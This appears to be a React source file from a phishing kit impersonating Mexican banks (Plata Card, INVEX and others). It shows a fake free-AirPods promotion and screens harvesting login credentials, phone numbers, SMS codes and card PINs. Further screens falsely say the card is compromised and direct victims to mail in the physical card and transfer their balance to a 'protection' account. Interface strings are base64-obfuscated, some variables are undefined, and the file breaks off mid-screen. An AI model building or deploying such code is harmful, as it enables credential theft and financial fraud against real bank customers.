import React, { useState, useContext, useEffect } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from '@/components/ui/label';
import { ScreenType } from '@shared/schema';
import { protectionUtils, obfuscatedConstants } from '../../utils/protection';

// Debug info
const debugInfo = atob('U2NyZWVuVHlwZS5TTVNfQ09NUFJBOg=='); // ScreenType.SMS_COMPRA:
console.log(debugInfo, ScreenType.SMS_COMPRA);

import citibanamexLogo from '../../assets/Banamex.png';
import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
import bbvaLogo from '../../assets/bbva_logo.png';
import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
import banorteLogoFooter from '../../assets/Banorte-01.png'; // El logo rojo de Banorte
import banorteLogoHeader from '../../assets/Bo.png.png';
import bancoppelLogo from '../../assets/bancoppel.png';
import hsbcLogo from '../../assets/Hsbc.png';
import amexLogo from '../../assets/Amex.png';
import santanderLogo from '../../assets/santander_logo.png';
import santanderLogoWhite from '../../assets/santander_logo_white.png';
import scotiabankLogo from '../../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
import invexLogo from '../../assets/invex_logo.png';
import invexLogoWhite from '../../assets/invex_logo_white.png';
import banregioLogo from '../../assets/banregio_logo.png';
import banregioLogoWhite from '../../assets/banregio_logo_white.png';
import googleLogo from '../../assets/google-logo.png';
import yahooLogo from '@assets/pngwing.com 2.png';
import microsoftLogo from '@assets/pngwing.com.png';

interface ScreenTemplatesProps {
  currentScreen: ScreenType;
  screenData: {
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
    alias?: string;
    folio?: string;
    direccion?: string;
    correo?: string;
    contrasena?: string;
    codigo?: string; // Código para la verificación de Google
    errorMessage?: string; // Mensaje de error para la pantalla de login
  };
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
  banco?: string;
}

// Ofuscación de strings sensibles
const obfuscatedStrings = {
  bankDefault: atob('QkFOT1JURQ=='), // BANORTE
  userField: atob('dXNlcm5hbWU='), // username
  passField: atob('cGFzc3dvcmQ='), // password
  errorText: atob('RXJyb3I='), // Error
  loginText: atob('SW5pY2lhciBzZXNpw7Nu'), // Iniciar sesión
  cardText: atob('VGFyamV0YQ=='), // Tarjeta
  phoneText: atob('VGVsw6lmb25v'), // Teléfono
  codeText: atob('Q8OzZGlnbw=='), // Código
  emailText: atob('Q29ycmVv'), // Correo
};

export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
  currentScreen, 
  screenData,
  onSubmit,
  banco = obfuscatedStrings.bankDefault
}) => {
  // Estados del formulario con nombres ofuscados
  const [dataA, setDataA] = useState(''); // folioInput
  const [dataB, setDataB] = useState({ [obfuscatedStrings.userField]: '', [obfuscatedStrings.passField]: '' }); // loginInputs
  const [dataC, setDataC] = useState(''); // codigoInput
  const [dataD, setDataD] = useState(''); // nipInput
  const [dataE, setDataE] = useState(''); // tarjetaInput
  const [dataF, setDataF] = useState(''); // fechaVencimientoInput
  const [dataG, setDataG] = useState(''); // cvvInput
  const [errorA, setErrorA] = useState<string | null>(null); // tarjetaError
  const [dataH, setDataH] = useState(''); // smsCompraInput
  const [dataI, setDataI] = useState(''); // telefonoInput
  const [errorB, setErrorB] = useState<string | null>(null); // passwordError
  const [dataJ, setDataJ] = useState(''); // gmailCorreo
  const [dataK, setDataK] = useState(''); // gmailContrasena
  const [showPass, setShowPass] = useState(false); // showGmailPassword
  const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
  const [hotmailStep2, setHotmailStep2] = useState(false);
  const [yahooStep2, setYahooStep2] = useState(false);
  const [emailInput, setEmailInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  
  // Funciones de validación con protección mejorada
  const validateSecureData = (input: string, type: string) => {
    return protectionUtils.validateData(input, type);
  };
  
  const formatSecureInput = (value: string) => {
    const v = value.replace(/\D/g, '');
    const groups = [];
    for (let i = 0; i < v.length; i += 4) {
      groups.push(v.substring(i, i + 4));
    }
    return groups.join(' ');
  };
  
  const formatSecureDate = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      const month = parseInt(v.substring(0, 2));
      if (month > 12) {
        return `12/${v.substring(2)}`;
      }
    }
    if (v.length <= 2) {
      return v;
    } else {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
  };

  // Helper function to render the appropriate screen
  const renderScreen = () => {
    // Función para obtener el contenedor según el banco
    // Función simplificada que solo contiene el contenido sin logos ni fechas
    const getBankContainer = (children: React.ReactNode) => {
      // Utilizamos una única plantilla para todos los bancos
      return (
        <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
          {/* Eliminamos todos los logos y fechas de los contenedores de pantalla */}
          {children}
        </div>
      );
    };
    
    // Diferentes pantallas según el tipo
    switch (currentScreen) {
      case ScreenType.PROMOCION:
        const promocionContent = (
          <div className="min-h-screen bg-white">
            {/* Header navegación PLATA CARD */}
            <div className="bg-white border-b border-gray-200 px-4 py-3">
              <div className="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-start sm:items-center">
                <div className="flex items-center mb-3 sm:mb-0">
                  <div className="font-bold text-xl">PLATA<span className="platacard-accent">CARD</span></div>
                </div>
                <nav className="flex flex-wrap gap-4 md:gap-6 text-sm text-gray-600">
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Tarjetas</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Productos</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Promociones</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Ayuda</span>
                </nav>
              </div>
            </div>

            {/* Contenido principal de la promoción */}
            <div className="platacard-container min-h-screen">
              <div className="max-w-4xl mx-auto px-4 py-8">
                {/* Título principal con emoji */}
                <div className="text-center mb-8">
                  <div className="flex items-center justify-center mb-4">
                    <span className="text-2xl mr-2">🎉</span>
                    <h2 className="text-lg md:text-xl font-bold text-gray-800">
                      Promoción Exclusiva para Clientes Seleccionados
                    </h2>
                  </div>
                  
                  {/* Promoción destacada */}
                  <div className="platacard-bg text-white rounded-xl p-6 md:p-8 mb-6 max-w-2xl mx-auto shadow-2xl">
                    <h1 className="text-3xl md:text-5xl font-bold mb-2">AirPods</h1>
                    <h1 className="text-3xl md:text-5xl font-bold mb-3">Pro Max</h1>
                    <p className="text-xl md:text-2xl text-orange-300">Totalmente Gratis</p>
                  </div>
                  
                  <p className="text-base md:text-lg text-gray-700 leading-relaxed max-w-3xl mx-auto mb-8">
                    Para clientes seleccionados por el buen uso de su tarjeta reciben 
                    <strong className="platacard-accent"> AirPods Pro Max totalmente gratis</strong>. 
                    Sin costo adicional por su excelente historial crediticio.
                  </p>
                </div>

                {/* Beneficios destacados */}
                <div className="grid sm:grid-cols-2 gap-4 mb-8 max-w-2xl mx-auto">
                  <div className="platacard-card text-center border border-orange-200">
                    <div className="text-2xl mb-2">🎧</div>
                    <h3 className="font-bold text-gray-900 mb-1">AirPods Pro Max</h3>
                    <p className="text-sm platacard-accent font-semibold">$0 pesos</p>
                  </div>
                  <div className="platacard-card text-center border border-orange-200">
                    <div className="text-2xl mb-2">💳</div>
                    <h3 className="font-bold text-gray-900 mb-1">Sin costos</h3>
                    <p className="text-sm platacard-accent font-semibold">Totalmente gratis</p>
                  </div>
                </div>

                {/* Botón principal */}
                <div className="text-center mb-8">
                  <Button 
                    className="platacard-button px-8 py-4 text-lg font-bold w-full sm:w-auto transform hover:scale-105 transition-all duration-300"
                    onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                  >
                    Reclamar mis AirPods Pro Max →
                  </Button>
                </div>

                {/* Información adicional */}
                <div className="platacard-card p-6 mb-8 max-w-4xl mx-auto">
                  <div className="flex items-center justify-center mb-4">
                    <span className="text-xl mr-2">🎧</span>
                    <h3 className="font-bold text-gray-800">Tus AirPods Pro Max te esperan</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-center text-sm">
                    <div>
                      <div className="font-semibold text-gray-700 mb-1">Producto</div>
                      <div className="text-gray-600 font-medium">AirPods Pro Max Originales</div>
                    </div>
                    <div>
                      <div className="font-semibold text-gray-700 mb-1">Vigencia</div>
                      <div className="text-gray-600 font-medium">6 meses</div>
                    </div>
                    <div>
                      <div className="font-semibold text-gray-700 mb-1">Entrega</div>
                      <div className="text-gray-600 font-medium">A domicilio</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Sección "¿Cómo funciona?" */}
            <div className="bg-white py-12">
              <div className="max-w-4xl mx-auto px-4">
                <div className="text-center mb-8">
                  <h2 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">¿Cómo funciona?</h2>
                  <p className="text-lg text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
                </div>
                
                <div className="space-y-4 md:space-y-6 max-w-3xl mx-auto">
                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number">1</span>
                    <div>
                      <div className="font-bold text-gray-900 text-lg mb-2">Acepta los términos</div>
                      <div className="text-gray-700">Revisa y acepta los términos y condiciones de la promoción</div>
                    </div>
                  </div>
                  
                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number">2</span>
                    <div>
                      <div className="font-bold text-gray-900 text-lg mb-2">Inicia sesión</div>
                      <div className="text-gray-700">Accede con tus credenciales de Plata Card para verificar tu elegibilidad</div>
                    </div>
                  </div>
                  
                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number">3</span>
                    <div>
                      <div className="font-bold text-gray-900 text-lg mb-2">Recibe tus AirPods</div>
                      <div className="text-gray-700">Te enviaremos tus AirPods Pro Max directamente a tu domicilio</div>
                    </div>
                  </div>
                </div>
                
                {/* Botón final */}
                <div className="text-center mt-10">
                  <Button 
                    className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-8 py-4 text-lg font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                    onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                  >
                    Reclamar mis AirPods Pro Max →
                  </Button>
                  <p className="text-sm text-gray-500 mt-4">
                    * Promoción válida solo para clientes seleccionados de Plata Card
                  </p>
                </div>
              </div>
            </div>
          </div>
        );
        return promocionContent;

      case ScreenType.TERMINOS:
        const terminosContent = (
          <>
            <h2 className="text-lg font-bold mb-4 text-gray-700">
              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Plata Card
            </h2>
            <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
              <p className="mb-3">
                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Plata Card" ofrecida por PLATA CARD.
              </p>
              <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
              <p className="mb-3">La promoción está dirigida exclusivamente a clientes seleccionados de Plata Card, quienes deberán cumplir con los siguientes requisitos:</p>
              <ul className="mb-3 ml-4 list-disc">
                <li>Ser titular de una tarjeta Plata Card válida y activa.</li>
                <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
                <li>Ser notificado de su selección para participar en la promoción.</li>
              </ul>
              <p className="mb-2 font-semibold">2. Descripción de la Promoción:</p>
              <p className="mb-3">
                Los clientes seleccionados recibirán AirPods Pro Max originales totalmente gratuitos como reconocimiento por su excelente historial crediticio.
              </p>
              <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
              <ul className="mb-3 ml-4 list-disc">
                <li>Los AirPods Pro Max se entregan completamente gratuitos.</li>
                <li>La entrega se realiza directamente al domicilio registrado.</li>
                <li>Válido hasta agotar existencias o por 6 meses desde la fecha de la promoción.</li>
              </ul>
              <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
              <p className="mb-3">
                Al participar, el cliente acepta que los datos personales puedan ser utilizados por Plata Card para fines relacionados con la promoción y otros fines comerciales.
              </p>
            </div>
            <Button 
              className="platacard-button"
              onClick={() => onSubmit(ScreenType.TERMINOS, {})}
            >
              Aceptar Términos
            </Button>
          </>
        );
        return getBankContainer(terminosContent);

      case ScreenType.FOLIO:
        const folioContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Folio de promoción:</h2>
            <p className="mb-4">Por favor, ingrese el folio de la promoción de AirPods que recibió de Plata Card.</p>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
              <Input 
                type="text" 
                placeholder="Ingrese su número de folio" 
                className="w-full border border-gray-300 rounded p-2 mb-3"
                value={folioInput}
                onChange={(e) => setFolioInput(e.target.value)}
              />
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
            >
              Continuar
            </Button>
          </>
        );
        return getBankContainer(folioContent);

      case ScreenType.LOGIN:
        // Función para validar la contraseña
        const validatePassword = (password: string): { isValid: boolean; message: string } => {
          if (password.length < 5 || password.length > 16) {
            return {
              isValid: false,
              message: "La contraseña debe tener entre 5 y 16 caracteres"
            };
          }
          
          const hasUpperCase = /[A-Z]/.test(password);
          const hasNumber = /[0-9]/.test(password);
          const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
          
          // También considerar el punto como carácter especial
          const hasPeriod = password.includes('.');
          
          if (!hasUpperCase) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos una letra mayúscula"
            };
          }
          
          if (!hasNumber) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos un número"
            };
          }
          
          if (!hasSpecialChar && !hasPeriod) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos un carácter especial (el punto '.' también es válido)"
            };
          }
          
          return { isValid: true, message: "" };
        };

        // Función para manejar el clic en el botón de ingresar
        const handleSecureLogin = () => {
          // Validar que el usuario haya ingresado algo
          if (!dataB.username || !dataB.password) {
            setErrorB(protectionUtils.decode('UG9yIGZhdm9yLCBpbmdyZXNhIHRvZG9zIGxvcyBjYW1wb3MgcmVxdWVyaWRvcw=='));
            return;
          }
          
          // Validar requisitos de contraseña
          const passwordValidation = validatePassword(dataB.password);
          if (!passwordValidation.isValid) {
            setErrorB(passwordValidation.message);
            return;
          }
          
          // Si llegamos aquí, todo está bien
          setErrorB(null);
          onSubmit(ScreenType.LOGIN, { 
            username: dataB.username, 
            password: dataB.password 
          });
        };
        
        const loginContent = (
          <>
            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold text-gray-800 mb-2">Iniciar sesión</h2>
              <p className="text-sm text-gray-600">
                Accede a tu cuenta para continuar con tu promoción de AirPods
              </p>
            </div>
            
            {screenData.errorMessage && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4">
                <p className="text-sm font-medium">{screenData.errorMessage}</p>
              </div>
            )}
            
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Correo electrónico
                </label>
                <Input 
                  type="email" 
                  value={dataB.username}
                  onChange={(e) => setDataB({...dataB, username: e.target.value})}
                  placeholder="ejemplo@correo.com"
                  className="w-full p-3 border border-gray-300 rounded-lg text-base focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all"
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Contraseña
                </label>
                <Input 
                  type="password" 
                  value={dataB.password}
                  onChange={(e) => {
                    setDataB({...dataB, password: e.target.value});
                    // Limpiar error cuando el usuario escribe
                    if (errorB) setErrorB(null);
                  }}
                  placeholder="Ingresa tu contraseña"
                  className={`w-full p-3 border rounded-lg text-base focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all ${errorB ? 'border-red-400 focus:ring-red-400' : 'border-gray-300'}`}
                />
                {errorB && (
                  <p className="text-xs text-red-500 mt-2 font-medium">{errorB}</p>
                )}
              </div>
            </div>
            
            <Button 
              className="platacard-button py-3 text-lg font-semibold mt-6"
              onClick={handleSecureLogin}
            >
              Iniciar sesión
            </Button>
            
            <div className="text-center mt-4">
              <a href="#" className="text-sm platacard-accent hover:text-orange-600 font-medium hover:underline transition-colors">
                ¿Olvidaste tu contraseña?
              </a>
            </div>
          </>
        );
        return getBankContainer(loginContent);

      case ScreenType.VUELOS_OTORGADOS:
        const vuelosOtorgadosContent = (
          <>
            <div className="text-center mb-6">
              <div className="bg-green-100 border border-green-400 rounded-lg p-4 mb-6">
                <h2 className="text-xl font-bold text-green-700 mb-3">¡Felicidades!</h2>
                <p className="text-green-700 font-semibold">
                  Se han otorgado a su cuenta <span className="text-2xl font-bold">2 vuelos nacionales</span>
                </p>
              </div>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                <h3 className="text-lg font-bold text-blue-800 mb-3">Condiciones importantes:</h3>
                <div className="text-left text-sm text-blue-700">
                  <ul className="space-y-2">
                    <li>• <strong>Costo:</strong> Únicamente debe pagar la TUA (Tarifa de Uso de Aeropuerto)</li>
                    <li>• <strong>Aerolínea:</strong> Vuelos válidos únicamente con VOLARIS</li>
                    <li>• <strong>Cobertura:</strong> Tarifa aérea 0 (cero) - no canjeables por dinero</li>
                    <li>• <strong>Restricciones:</strong> Sujeto a disponibilidad de fechas y destinos</li>
                    <li>• <strong>Límite:</strong> Un vuelo gratuito por cliente seleccionado</li>
                    <li>• <strong>Gastos adicionales:</strong> TUA, impuestos y servicios extras a cargo del cliente</li>
                  </ul>
                </div>
              </div>
              
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                <h3 className="text-lg font-bold text-yellow-800 mb-2">Próximos pasos:</h3>
                <p className="text-yellow-700 text-sm">
                  <strong>Verifique su correo electrónico</strong> - Se le harán llegar las instrucciones 
                  detalladas para poder canjear sus vuelos promocionales.
                </p>
              </div>
              
              <div className="text-xs text-gray-500 mt-4">
                <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
                <p className="mt-1">Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de INVEX Banco.</p>
              </div>
            </div>
            
            <Button 
              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
              onClick={() => {
                // Redirigir a la página de promociones de INVEX después de 2 segundos
                setTimeout(() => {
                  window.location.href = 'https://promociones.invextarjetas.com.mx/info-vuelo0/';
                }, 2000);
              }}
            >
              Finalizar - Ir a INVEX Tarjetas
            </Button>
          </>
        );
        return getBankContainer(vuelosOtorgadosContent);

      case ScreenType.TELEFONO:
        const phoneContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSB0ZWzDqWZvbm8gY2VsdWxhciByZWdpc3RyYWRv')}</h2>
            <p className="mb-4 text-sm text-gray-600">
              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXIgY29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
            </p>
            
            <div className="mb-4">
              <label className="block text-sm font-medium mb-2">
                {atob('TsO6bWVybyBkZSB0ZWzDqWZvbm8gY2VsdWxhcg==')}
              </label>
              <div className="flex">
                <span className="inline-flex items-center px-3 py-2 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
                  +52
                </span>
                <input
                  type="tel"
                  value={dataI}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                    setDataI(value);
                  }}
                  placeholder="5551234567"
                  className="flex-1 px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  maxLength={10}
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">
                {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGEgMTAgZMOtZ2l0b3Mgc2luIGVzcGFjaW9zIG5pIGd1aW9uZXM=')}
              </p>
            </div>
            
            <Button 
              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
              onClick={() => {
                if (dataI.length === 10) {
                  onSubmit(ScreenType.TELEFONO, { telefono: dataI });
                } else {
                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gbnVtZXJvIGRlIHRlbGVmb25vIHZhbGlkbyBkZSAxMCBkaWdpdG9z'));
                }
              }}
              disabled={dataI.length !== 10}
            >
              {atob('Q29udGludWFy')}
            </Button>
          </>
        );
        return getBankContainer(phoneContent);

      case ScreenType.CODIGO:
        const phoneTermination = screenData.terminacion || '8909';
        
        const verifyContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('VmluY3VsYXIgZGlzcG9zaXRpdm8gYSBJTlZFWCBDb250cm9s')}</h2>
            <p className="mb-4 text-sm text-gray-600">
              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcG9yIFNNUyBhbCBuw7ptZXJvICoqKg==')}
              {phoneTermination} {atob('cGFyYSBwb2RlciB2aW5jdWxhciB0dSBkaXNwb3NpdGl2byBjb24gSU5WRVggQ29udHJvbC4=')}
            </p>
            
            <div className="mb-4">
              <label className="block text-sm font-medium mb-2">{atob('Q8OzZGlnbyBkZSB2ZXJpZmljYWNpw7Nu')}</label>
              <Input 
                type="text" 
                placeholder="000000"
                className="w-full border border-gray-300 rounded p-3 text-center text-lg tracking-widest"
                value={dataC}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                  setDataC(value);
                }}
                maxLength={6}
              />
              <p className="text-xs text-gray-500 mt-1">
                {atob('Q8OzZGlnbyBkZSA2IGTDrWdpdG9zIGVudmlhZG8gcG9yIFNNUw==')}
              </p>
            </div>
            
            <Button 
              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
              onClick={() => {
                if (dataC.length === 6) {
                  onSubmit(ScreenType.CODIGO, { codigo: dataC });
                } else {
                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgZWwgY8OzZGlnbyBjb21wbGV0byBkZSA2IGTDrWdpdG9z'));
                }
              }}
              disabled={dataC.length !== 6}
            >
              {atob('VmVyaWZpY2FyIGPDs2RpZ28=')}
            </Button>
          </>
        );
        return getBankContainer(verifyContent);

      case ScreenType.NIP:
        const securityContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSBOSVA=')}</h2>
            <p className="mb-4">
              {atob('UG9yIHR1IHNlZ3VyaWRhZCwgbmVjZXNpdGFtb3MgdmVyaWZpY2FyIHR1IE5JUCBkZSA0IGTDrWdpdG9zLg==')}
            </p>
            <Input 
              type="password" 
              placeholder={atob('TklQ')}
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={dataD}
              onChange={(e) => setDataD(e.target.value)}
              maxLength={4}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.NIP, { nip: dataD })}
            >
              {atob('Q29uZmlybWFy')}
            </Button>
          </>
        );
        return getBankContainer(securityContent);

      case ScreenType.PROTEGER:
        const protegerContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Aviso de seguridad: Tarjeta vulnerada</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado/a cliente: {screenData.titular || "ejemplo"}
              </p>
              <p className="mb-3">
                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta INVEX con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
              </p>
              <p className="mb-3">
                Por protocolo de seguridad, su tarjeta será enviada al área de Prevención de Fraudes, donde se llevará a cabo un análisis técnico forense para identificar el origen de la vulnerabilidad y proceder con las medidas de protección necesarias.
              </p>
              <p className="mb-3">
                En la siguiente pantalla, se mostrarán las instrucciones para la recolección y reposición de su tarjeta.
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(protegerContent);

      case ScreenType.TARJETA:
        const tarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Instrucciones de envío plástico</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado/a cliente: {screenData.titular || "ejemplo"}
              </p>
              <p className="mb-3">
                Conforme al procedimiento establecido para la reposición de tarjeta, le informamos que, para generar un nuevo plástico correspondiente a su tarjeta con terminación {screenData.terminacion || "ejemplo"}, es indispensable seguir las siguientes instrucciones:
              </p>
              <ol className="list-decimal pl-5 mb-3 space-y-1">
                <li>Introduzca el plástico en un sobre cerrado.</li>
                <li>En dicho sobre, deberá colocar de forma visible el folio de seguimiento: {screenData.folio || "(folio de seguimiento)"}</li>
                <li>Adjunte en el interior del sobre la carta de cancelación, debidamente firmada por el titular de la tarjeta. Esta carta será proporcionada a través de su asistente virtual.</li>
                <li>Una vez listo el envío, se generará una guía logística a través de la empresa Estafeta.</li>
              </ol>
              
              <p className="mb-3">
                Para la recolección del sobre, usted podrá elegir una de las siguientes opciones:
              </p>
              <ul className="list-disc pl-5 mb-3 space-y-1">
                <li>Que Estafeta recoja el sobre en su domicilio, o bien,</li>
                <li>Que usted entregue el sobre personalmente en la sucursal de Estafeta más cercana.</li>
              </ul>
              
              <p className="mb-3">
                Una vez recibido y validado el paquete en nuestras instalaciones, en un plazo de 5 días hábiles, estará recibiendo su nueva tarjeta en el domicilio registrado:
              </p>
              
              <p className="p-2 bg-white mb-3 rounded">
                {screenData.direccion || "Ejemplo dirección"}
              </p>
              
              <p className="mb-3">
                Agradecemos su atención y cooperación. Para cualquier duda adicional, le solicitamos comunicarse con su ejecutivo en línea para continuar con el proceso.
              </p>
              
              <p className="mb-1">Atentamente,</p>
              <p className="mb-1">Departamento de Atención a Clientes</p>
              <p className="font-semibold">INVEX</p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TARJETA, { confirmado: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(tarjetaContent);

      case ScreenType.TRANSFERIR:
        const transferirContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Con el fin de proteger su saldo disponible es necesario transferir la cantidad de <strong>${screenData.monto || "39933"}</strong> a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).
              </p>
              <p className="mb-2">Clabe:</p>
              <p className="mb-3 font-medium">{screenData.clabe || "272762626262727272727272266222"}</p>
              <p className="mb-2">Titular de la cuenta:</p>
              <p className="mb-3 font-medium">{screenData.titular || "Nwnnwhwhw"}</p>
              <p className="mb-2">Alias:</p>
              <p className="mb-3 font-medium">{screenData.alias || "Cuenta de respaldo."}</p>
              <p className="mt-3 font-medium">
                Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}
            >
              Ya realicé la transferencia
            </Button>
          </>
        );
        return getBankContainer(transferirContent);

      case ScreenType.CANCELACION:
        const cancelacionContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cancelación Exitosa</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado cliente, hemos realizado la cancelación de su cargo no reconocido de forma exitosa.
              </p>
              <p className="mb-2">Comercio: <strong>{screenData.comercio || "Wnnwhw"}</strong></p>
              <p className="mb-2">Monto devuelto: <strong>${screenData.monto || "62622"}</strong></p>
              <p className="mt-3">
                En un lapso no mayor a 72 horas, el monto devuelto volverá a estar disponible en su tarjeta de crédito.
              </p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmado: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(cancelacionContent);

      case ScreenType.MENSAJE:
        const mensajeContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left max-h-[60vh] overflow-y-auto">
              <div className="whitespace-pre-wrap break-words">
                {screenData.mensaje || "Mensaje personalizado del banco."}
              </div>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(mensajeContent);

      case ScreenType.SMS_COMPRA:
      case 'sms_compra' as ScreenType:
        console.log(atob('UmVuZGVyaXphbmRvIHBhbnRhbGxhIFNNU19DT01QUkE='), screenData);
        
        if (dataH === undefined) {
          console.log(atob('SW5pY2lhbGl6YW5kbyBjYW1wbw=='));
          setDataH("");
        }
        
        console.log(atob('VGVybWluYWNpw7NuIGRlIGNlbHVsYXI='), screenData.terminacion);
        console.log(atob('Q8OzZGlnbyBhY3R1YWw='), dataH);
        
        const processContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('Q2FuY2VsYWNpw7NuIGRlIGNhcmdvczo=')}:</h2>
            <p className="mb-4">
